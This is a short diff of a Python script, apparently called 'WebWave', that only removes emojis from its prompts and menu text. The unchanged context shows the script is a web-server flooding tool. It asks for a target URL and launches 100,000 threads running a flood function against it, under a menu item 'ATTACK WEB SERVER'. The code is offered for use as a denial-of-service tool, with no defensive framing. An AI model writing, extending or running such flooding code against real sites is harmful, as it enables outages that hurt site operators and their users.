@@ -68,8 +68,8 @@ def flood(url):
             print(f"Error: {e}")
 
 def start_flooding():
-    target_url = input("[+] ⚔️  TARGET URL ⚔️  : ")
-    print("[+] ATTACK START...💣")
+    target_url = input("[+] TARGET URL : ")
+    print("[+] ATTACK START...")
     
     for i in range(100000): 
         thread = threading.Thread(target=flood, args=(target_url,))
@@ -78,9 +78,9 @@ def start_flooding():
 if __name__ == "__main__":
     WebWave()
     while True:
-        print("[1]💣 ATTACK WEB SERVER 💣")
-        print("[2] Exit 👋")
-        choice = input("OPTION 🔎 : ")
+        print("[1] ATTACK WEB SERVER ")
+        print("[2] Exit")
+        choice = input(">> ")
         if choice == '1':
             start_flooding()
         elif choice == '2':
